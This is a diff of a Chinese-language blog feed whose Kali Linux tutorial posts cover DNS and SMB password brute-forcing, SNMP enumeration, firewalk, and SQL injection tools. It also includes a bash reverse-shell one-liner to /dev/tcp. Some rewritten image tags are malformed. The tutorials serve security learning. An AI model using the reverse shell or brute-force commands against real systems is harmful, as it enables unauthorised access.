 <li>图中的 100.64.0.1 其实是下一节点的 IP 地址，如果它也在内网中是一个路由节点的话那么我们的下一条命令应该是firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 100.64.0.1 8.8.8.8  通过最上面我给大家看的测试用图可知100.64.0.1 其实是公网IP</li>
@@ -532,7 +531,7 @@
     <link href="http://TimeS0ng.github.io/2018/03/08/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
     <id>http://TimeS0ng.github.io/2018/03/08/kali使用入坑指南（二）/</id>
     <published>2018-03-08T15:19:13.000Z</published>
-    <updated>2018-04-15T14:45:21.276Z</updated>
+    <updated>2018-12-18T15:27:14.483Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"><a href="#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。" class="headerlink" title="&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"></a>&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。</h4><a id="more"></a>
 <h2 id="0x01-DNS-爆破工具–fierce"><a href="#0x01-DNS-爆破工具–fierce" class="headerlink" title="0x01. DNS 爆破工具–fierce"></a>0x01. DNS 爆破工具–fierce</h2><blockquote>
@@ -540,13 +539,13 @@
 <p>爆破二级域名</p>
 <p>fierce -dns kali.org -threads 10</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180308222717_PXjw12_Screenshot.jpeg" alt=""><br><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180308222753_JKcqYH_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222717_PXjw12_Screenshot.jpeg" alt=""><br><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222753_JKcqYH_Screenshot.jpeg" alt=""></p>
 <h2 id="0x02-SMB-爆破工具–acccheck"><a href="#0x02-SMB-爆破工具–acccheck" class="headerlink" title="0x02. SMB 爆破工具–acccheck"></a>0x02. SMB 爆破工具–acccheck</h2><blockquote>
 <p>acccheck是用于探测远程目标主机是否开放smb服务,并尝试连接目标默认IPC$、ADMIN$共享,并通过字典文件尝试爆破 smb 服务的账号密码。有些工具比较简单，所以命令我就不一一介绍了，大家直接用 acccheck -h 就能查看具体的参数介绍。</p>
 <p>acccheck -t 192.168.122.140 -u times0ng -P /usr/share/wordlists/wfuzz/general/common.txt -v</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180308225313_sPwpVJ_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180308225518_JesTGg_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225313_sPwpVJ_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225518_JesTGg_Screenshot.jpeg" alt=""></p>
 <h2 id="0x03-SNMP-信息枚举工具–-snmp-check"><a href="#0x03-SNMP-信息枚举工具–-snmp-check" class="headerlink" title="0x03. SNMP 信息枚举工具– snmp-check"></a>0x03. SNMP 信息枚举工具– snmp-check</h2><blockquote>
 <p>简单网络管理协议（SNMP）是TCP／IP协议簇的一个应用层协议，工作在UDP 161端口，用于监控目标设备的操作系统、硬件设备、服务应用、软硬件配置、网络协议状态、设备性能及资源利用率、设备报错事件信息、应用程序状态等软硬件信息。对于渗透测试者来说简直就是信息宝藏，一旦这个服务协议被利用，那么目标的大部分配置信息都会暴露无遗，对于企业来说这是致命的，而想要利用这个协议的弱点只需要服务器管理员缺乏安全意识做一些默认配置即可。</p>
 <p>这个工具并不支持对 public 的爆破，但如果使用 hydra 爆破public 之后再使用snmp-check 获取 SNMP 协议提供的海量信息的话简直是 perfect</p>
@@ -558,15 +557,15 @@
 <p>首先apt-get 安装firewalk，然后启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</p>
 <p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
 <h2 id="0x05-图形化sql自动注入工具—-jSQL"><a href="#0x05-图形化sql自动注入工具—-jSQL" class="headerlink" title="0x05. 图形化sql自动注入工具—-jSQL"></a>0x05. 图形化sql自动注入工具—-jSQL</h2><blockquote>
 <p>jSQL injection是一款基于JAVA开发的图形化 SQL 自动注入工具，包含数据库查询、后台爆破、文件读取、命令行、文件上传、目录爆破、编码转换等众多功能，既支持GET 型SQL 注入，也同时支持POST 型注入，还能定制header 头，是一款不可多得的好工具，很像kali 版御剑</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180328215004_6eQEsq_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328215004_6eQEsq_Screenshot.jpeg" alt=""></p>
 <h2 id="0x06-WEB-漏洞扫描工具—-OWASP-ZAP"><a href="#0x06-WEB-漏洞扫描工具—-OWASP-ZAP" class="headerlink" title="0x06. WEB 漏洞扫描工具—-OWASP-ZAP"></a>0x06. WEB 漏洞扫描工具—-OWASP-ZAP</h2><blockquote>
 <p>最近自己利用 OWASP-ZAP 简单录制了一套web 渗透教程发到b 站了，大家有兴趣可以<a href="https://www.bilibili.com/video/av20890776/" target="_blank" rel="external">点这里</a>，基本用法我都提到过了，还简单讲了一些渗透环境的搭建和利用。</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180328220834_N7Y5J3_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328220834_N7Y5J3_Screenshot.jpeg" alt=""></p>
 <h2 id="0x07-“kali-下的菜刀”—-Altman"><a href="#0x07-“kali-下的菜刀”—-Altman" class="headerlink" title="0x07. “kali 下的菜刀”—-Altman"></a>0x07. “kali 下的菜刀”—-Altman</h2>]]></content>
     
     <summary type="html">
@@ -668,10 +667,10 @@
   
   <entry>
     <title>kali使用入坑指南(一)</title>
-    <link href="http://TimeS0ng.github.io/2018/03/01/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80)/"/>
-    <id>http://TimeS0ng.github.io/2018/03/01/kali使用入坑指南(一)/</id>
+    <link href="http://TimeS0ng.github.io/2018/03/01/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+    <id>http://TimeS0ng.github.io/2018/03/01/kali使用入坑指南（一）/</id>
     <published>2018-03-01T12:25:58.000Z</published>
-    <updated>2018-03-05T16:02:21.509Z</updated>
+    <updated>2018-12-18T15:30:06.977Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"><a href="#emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！" class="headerlink" title="&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"></a>&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！</h4><a id="more"></a>
 <h2 id="0x01-kali安装中文输入法"><a href="#0x01-kali安装中文输入法" class="headerlink" title="0x01. kali安装中文输入法"></a>0x01. kali安装中文输入法</h2><blockquote>
@@ -680,78 +679,78 @@
 </ol>
 <p>apt-get install ibus ibus-pinyin</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301093227_Bi7qWn_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301093227_Bi7qWn_Screenshot.jpeg)</p>
 <blockquote>
 <ol>
 <li>设置language，之后重启系统就能使用中文，不必太麻烦</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301093613_rmRK04_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301093613_rmRK04_Screenshot.jpeg)</p>
 <h2 id="0x02-kali中安装截图软件-shutter"><a href="#0x02-kali中安装截图软件-shutter" class="headerlink" title="0x02. kali中安装截图软件 shutter"></a>0x02. kali中安装截图软件 shutter</h2><blockquote>
 <p>apt-get install shutter</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301201713_O1AXhi_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301201713_O1AXhi_Screenshot.jpeg)</p>
 <blockquote>
 <p>下面就是我用shutter截的桌面图片</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301201931_pWfnu9_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301201931_pWfnu9_Screenshot.jpeg)</p>
 <h2 id="0x03-kali-安装硬件检测软件-hardinfo"><a href="#0x03-kali-安装硬件检测软件-hardinfo" class="headerlink" title="0x03. kali 安装硬件检测软件 hardinfo"></a>0x03. kali 安装硬件检测软件 hardinfo</h2><blockquote>
 <p>apt-get install hardinfo</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303170704_ALlIlf_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303170704_ALlIlf_Screenshot.jpeg)</p>
 <blockquote>
 <p>hardinfo可以让我们轻松的查看系统硬件配置，其功能有点像鲁大师，不过我却没用过鲁大师哈哈哈哈！</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303170842_Vw0EnH_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303170842_Vw0EnH_Screenshot.jpeg)</p>
 <h2 id="0x04-kali-录屏软件-EasyScreenCast"><a href="#0x04-kali-录屏软件-EasyScreenCast" class="headerlink" title="0x04. kali 录屏软件 EasyScreenCast"></a>0x04. kali 录屏软件 EasyScreenCast</h2><blockquote>
 <p>今天笔者也利用kali中自带的录屏软件 EasyScreenCast 录了一个Wi-Fi破解的视频放到B站，如果感兴趣可以<a href="https://www.bilibili.com/video/av20318401/" target="_blank" rel="external">戳这里</a>。EasyScreenCast 使用简单方便，根据自己需要稍稍修改一下参数就能录制满足自己简单要求的视频。</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303171817_6QKqw8_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303171817_6QKqw8_Screenshot.jpeg)</p>
 <h2 id="0x05-kali-音乐播放器-VLC"><a href="#0x05-kali-音乐播放器-VLC" class="headerlink" title="0x05. kali 音乐播放器 VLC"></a>0x05. kali 音乐播放器 VLC</h2><blockquote>
 <p>虽然 VLC 没有像 Mac 版QQ 音乐那么唯美的优化，但我们也不能对开源如此苛刻，毕竟它从没令我失望过！</p>
 <p>apt-get install vlc</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303191548_k9LYCB_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303191548_k9LYCB_Screenshot.jpeg)</p>
 <blockquote>
 <p>安装完成之后，因为它默认不能以root账号启动，所以我们需要修改 /usr/bin/vlc 文件，将原来的geteuid 修改为现在的 getppid</p>
 <p>hexedit /usr/bin/vlc</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303191650_jLTfN6_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303191650_jLTfN6_Screenshot.jpeg)</p>
 <blockquote>
 <p>在终端输入 vlc 就能调出</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303193126_rzgeBG_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303193126_rzgeBG_Screenshot.jpeg)</p>
 <h2 id="0x06-kali-使用bash-一句话反弹shell"><a href="#0x06-kali-使用bash-一句话反弹shell" class="headerlink" title="0x06. kali 使用bash 一句话反弹shell"></a>0x06. kali 使用bash 一句话反弹shell</h2><blockquote>
 <p>进行渗透测试时经常遇到Linux 中不存在 nc 或者 nc 一经反弹shell就出现各种报错，直到遇到bash 一句话后麻麻再也不用担心我拿不到shell 啦！！</p>
 <p>bash -i &gt;&amp; /dev/tcp/192.168.1.107/4444 0&gt;&amp;1</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303192839_XDBQbF_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303192839_XDBQbF_Screenshot.jpeg)</p>
 <h2 id="0x07-kali-使用ncat-作-http-代理"><a href="#0x07-kali-使用ncat-作-http-代理" class="headerlink" title="0x07. kali 使用ncat 作 http 代理"></a>0x07. kali 使用ncat 作 http 代理</h2><blockquote>
 <p>当需要代理服务器时，可以使用 ncat 来代替，当然这是需要密码验证的，也不是任何人都能通过我们的代理服务器上网</p>
 <p>ncat -l 8080 <strong>-</strong>-proxy-type http –proxy-auth admin:root</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303195304_KAYICq_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303195334_duCLPP_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303195304_KAYICq_Screenshot.jpeg)</p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303195334_duCLPP_Screenshot.jpeg)</p>
 <h2 id="0x08-kali-使用squid3-作http-代理"><a href="#0x08-kali-使用squid3-作http-代理" class="headerlink" title="0x08. kali 使用squid3 作http 代理"></a>0x08. kali 使用squid3 作http 代理</h2><blockquote>
 <p>squid3 可以很方便的帮助我们搭建内网的http 代理服务器，当我们启动squid3 之后它会默认启动3128 端口，我们只需要在浏览器设置代理就可以使用了。不过在这之前我们首先应该修改squid3 的默认配置，将 /etc/squid/squid.conf 中的http_access deny all 修改为http_access allow all 这样才能作为代理服务器使用</p>
 <p>vim /etc/squid/squid.conf</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305175930_Xks0id_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305175930_Xks0id_Screenshot.jpeg)</p>
 <blockquote>
 <p>squid3</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305180011_6T2Daa_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305180036_Uxee4d_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305180011_6T2Daa_Screenshot.jpeg)</p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305180036_Uxee4d_Screenshot.jpeg)</p>
 <h2 id="0x09-kali-安装翻译字典"><a href="#0x09-kali-安装翻译字典" class="headerlink" title="0x09. kali 安装翻译字典"></a>0x09. kali 安装翻译字典</h2><blockquote>
 <p>goldendict 是Linux 中字典的不二选择，同时它还支持选词翻译，这是一个相当不错的功能。笔者因为给自己定了个目标要看kali 官网的教程，所以只有去读英文资料，而goldendict 帮了我不小的忙！</p>
 <p>下载好goldendict 之后需要稍稍配置一下词典Edict-&gt;dict-&gt;website，增加youdao 的翻译网址 <a href="http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8" target="_blank" rel="external">http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8</a></p>
 <p>之后我们选中单词按 CTRL+C+C 就可以随时翻译了</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305231416_6b8vJS_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305231416_6b8vJS_Screenshot.jpeg)</p>
 <h2 id="0x10-kali-安装插件"><a href="#0x10-kali-安装插件" class="headerlink" title="0x10. kali 安装插件"></a>0x10. kali 安装插件</h2><blockquote>
 <p>使用浏览器访问 <a href="http://extensions.gnome.org" target="_blank" rel="external">http://extensions.gnome.org</a> 就可以给kali 安装扩展，安装netspeed 插件之后就可以监控网络流量</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180305235955_Y7cZTJ_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305235955_Y7cZTJ_Screenshot.jpeg)</p>
 <h2 id="0xFF-关于kali的小技巧"><a href="#0xFF-关于kali的小技巧" class="headerlink" title="0xFF. 关于kali的小技巧"></a>0xFF. 关于kali的小技巧</h2><h4 id="emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"><a href="#emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。" class="headerlink" title="&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"></a>&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。</h4><h4 id="emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式"><a href="#emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式" class="headerlink" title="&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式"></a>&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式</h4><h4 id="emsp-emsp-2-top命令查看当前CPU占用率最大的任务"><a href="#emsp-emsp-2-top命令查看当前CPU占用率最大的任务" class="headerlink" title="&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务"></a>&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务</h4><h4 id="emsp-emsp-3-pkill或者kill-掉该任务"><a href="#emsp-emsp-3-pkill或者kill-掉该任务" class="headerlink" title="&emsp;&emsp;3. pkill或者kill 掉该任务"></a>&emsp;&emsp;3. pkill或者kill 掉该任务</h4><h4 id="emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题"><a href="#emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题" class="headerlink" title="&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题"></a>&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题</h4>]]></content>
     
     <summary type="html">
@@ -768,7 +767,7 @@
     <link href="http://TimeS0ng.github.io/2018/03/01/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/"/>
     <id>http://TimeS0ng.github.io/2018/03/01/kali安装KVM入坑笔记/</id>
     <published>2018-03-01T02:18:31.000Z</published>
-    <updated>2018-03-01T12:25:18.590Z</updated>
+    <updated>2018-12-18T15:23:29.300Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…"><a href="#emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…" class="headerlink" title="&emsp;&emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …"></a>&emsp;&emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …</h4><a id="more"></a>
 <h2 id="0x01-制作U盘启动盘"><a href="#0x01-制作U盘启动盘" class="headerlink" title="0x01. 制作U盘启动盘"></a>0x01. 制作U盘启动盘</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-kali-的-ISO-镜像文件"><a href="#emsp-emsp-1-kali-的-ISO-镜像文件" class="headerlink" title="&emsp;&emsp; 1. kali 的 ISO 镜像文件"></a>&emsp;&emsp; 1. kali 的 ISO 镜像文件</h4><h4 id="emsp-emsp-2-dd-命令-Linux-的bash基本都具备dd，笔者用的Mac也同样可以"><a href="#emsp-emsp-2-dd-命令-Linux-的bash基本都具备dd，笔者用的Mac也同样可以" class="headerlink" title="&emsp;&emsp; 2. dd 命令( Linux 的bash基本都具备dd，笔者用的Mac也同样可以)"></a>&emsp;&emsp; 2. dd 命令( Linux 的bash基本都具备dd，笔者用的Mac也同样可以)</h4><h4 